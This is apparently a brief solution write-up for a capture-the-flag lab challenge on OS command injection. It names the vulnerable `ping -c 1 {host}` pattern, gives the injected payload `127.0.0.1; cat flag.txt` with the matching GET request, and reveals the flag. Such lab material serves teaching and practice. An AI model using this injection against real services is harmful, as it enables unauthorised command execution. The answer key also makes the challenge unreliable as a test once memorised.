# Solution: A08 - COMMAND INJECTION

## Concept
Arbitrary operating system command injection (RCE).

## Walkthrough
1. Inspect `challenge/app/app.py`.
2. Notice the shell execution pattern: `ping -c 1 {host}`.
3. Payload: `127.0.0.1; cat flag.txt`
4. Request:
   ```text
   GET /?host=127.0.0.1;+cat+flag.txt
   ```
5. Flag output: `command injection rce`.

## Flag
`command injection rce`
